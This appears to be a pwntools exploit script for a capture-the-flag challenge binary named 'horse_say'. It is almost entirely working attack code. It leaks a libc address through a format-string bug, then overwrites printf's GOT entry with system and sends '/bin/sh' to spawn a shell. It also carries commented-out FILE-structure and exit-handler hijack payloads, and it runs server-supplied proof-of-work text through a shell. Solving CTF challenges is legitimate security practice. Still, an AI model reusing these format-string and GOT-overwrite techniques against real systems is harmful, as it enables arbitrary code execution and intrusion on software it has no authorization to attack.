from pwn import *
from subprocess import check_output
import sys
import os
import subprocess


_path = "./horse_say_patched"
context.binary = exe = ELF(_path, checksec=False)
libc = ELF("./libc.so.6", checksec=False)
#ld = ELF("./ld-linux-x86-64.so.2", checksec=False)
addr = 'localhost'
port = 8080
cmd = f'''
    set solib-search-path {os.getcwd()}
    decompiler connect ida --host localhost --port 3662
    break *0x40145A
    break *0x40150A
    continue
'''

context.terminal = ['wt.exe', 'wsl', '-e', 'bash', '-c']

def get_pid(name):
    return int(check_output(["pgrep", "-f", "-n", name]))
def conn():
    if args.LOCAL:
        if args.GDB:
            p = gdb.debug(_path, cmd)
        else:
            p = exe.process()
    
    if args.DOCKER:
        p = remote(addr, port)
        sleep(2)
        if args.GDB:
            pid = get_pid("")
            gdb.attach(pid, exe=exe.path,
                    gdbscript=cmd+f"\n set sysroot /proc/{pid}/root\nfile /proc/{pid}/exe")
            pause()

    elif args.REMOTE:
        host_port = sys.argv[1:]
        p = remote(host_port[0], int(host_port[1]))
    return p

rol = lambda val, r_bits, max_bits: \
    (val << r_bits%max_bits) & (2**max_bits-1) | \
    ((val & (2**max_bits-1)) >> (max_bits-(r_bits%max_bits)))

ror = lambda val, r_bits, max_bits: \
    ((val & (2**max_bits-1)) >> r_bits%max_bits) | \
    (val << (max_bits-(r_bits%max_bits)) & (2**max_bits-1))

def encrypt(v, key):
    return p(rol(v ^ key, 0x11, 64))

#############  next | count  | type (cxa) | addr                             | arg               | not used
#onexit_fun =  p(0) + p(1)  +  p(4)       + encrypt(libc.sym['system'], key) + p(heap + 0x2c0)  +  p(0)
'''
_op_file = FileStructure()
_op_file.unknown2 = p(0)*2 + p(libc.sym["system"]) + p(0)*3 + p(libc.sym["_IO_wfile_jumps"] - 0x20 ) + p(libc.sym["_IO_2_1_stdout_"] +0x50)
_op_file._wide_data = libc.sym["_IO_2_1_stdout_"]
_op_file.flags = 0xfbad20b1 + (int.from_bytes(b';sh;', 'little') << 32)
_op_file._lock = libc.address + 0x21a200
_tmp_file = bytes(_op_file)
'''

def p(_data, _arch = 64, endian = 'little'):
    switcher = {
        64: p64(_data & 0xffffffffffffffff, endian),
        32: p32(_data & 0xffffffff, endian),
        16: p16(_data & 0xffff, endian),
        8:  p8(_data & 0xff, endian)
    }
    return switcher[_arch]

chall = conn()

def sl(_data):
    chall.sendline(_data)

def sla(rgx, _data):
    chall.sendlineafter(rgx, _data)

def se(_data):
    chall.send(_data)

def sa(rgx, _data):
    chall.sendafter(rgx, _data)

def check():
    chall.interactive()
    exit()

def main():
    chall.recvuntil(b"proof of work: ")
    out = subprocess.check_output(chall.recvline().strip().decode(), shell=True, stderr=subprocess.STDOUT, text=True, timeout=30)
    print((out).__repr__())
    sla(b"solution: ", out.strip())

    fmt = f"%{0x12D9}c%14$hn".ljust(16, "\00").encode() + p64(0x404048) 
    sla(b"Say something: ", fmt)
    fmt = f"%281$p"
    sla(b"Say something: ", fmt)
    chall.recvuntil(b"< ")
    leak = int(chall.recv(14), 16)
    libc.address = leak - libc.sym.__libc_start_call_main - 122
    log.info(f"libc @ {hex(libc.address)}") 
    printf_got = 0x404028
    ov1 = libc.sym.system & 0xff
    ov2 = (libc.sym.system >> 8) & 0xffff
    fmt = f"%{ov1}c%16$hhn.%{ov2-ov1-1}c%17$hn".ljust(32, "\00").encode() + p64(printf_got) + p64(printf_got+1)
    sla(b"Say something: ", fmt)
    sleep(0.2)
    sl(b"/bin/sh")  

    check()

if __name__ == "__main__":
    main()
